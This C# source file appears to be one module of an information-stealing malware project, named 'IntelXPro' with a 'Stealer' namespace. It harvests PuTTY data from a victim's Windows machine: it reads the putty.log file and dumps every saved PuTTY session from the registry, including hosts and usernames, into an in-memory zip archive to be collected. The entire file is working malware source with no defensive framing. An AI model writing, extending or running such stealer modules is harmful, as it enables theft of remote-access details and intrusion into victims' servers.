using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class PuTTY : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "PuTTY";
            Logs(zip, counterApplications);
            Sessions(zip, counterApplications);
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("PuTTY\\");
                counter.Applications.Add(counterApplications);
            }
        }

        private void Logs(InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            string text = "C:\\Program Files\\PuTTY\\putty.log";
            if (File.Exists(text))
            {
                string text2 = "PuTTY\\putty.log";
                zip.AddFile(text2, File.ReadAllBytes(text));
                counterApplications.Files.Add(text + " => " + text2);
            }
        }

        private void Sessions(InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            string text = "Software\\SimonTatham\\PuTTY\\Sessions";
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, writable: false))
            {
                if (registryKey == null)
                {
                    return;
                }
                string[] array = registryKey.GetSubKeyNames().OrderBy((string x) => x, StringComparer.OrdinalIgnoreCase).ToArray();
                if (array.Length == 0)
                {
                    return;
                }
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    using (RegistryKey registryKey2 = registryKey.OpenSubKey(text2, writable: false))
                    {
                        if (registryKey2 != null)
                        {
                            string text3 = "PuTTY\\session_" + text2 + ".txt";
                            string text4 = string.Join("\n", RegistryParser.ParseKey(registryKey2));
                            zip.AddTextFile(text3, text4);
                            counterApplications.Files.Add(text + "\\" + text2 + " => " + text3);
                        }
                    }
                }
            }
        }
    }
}
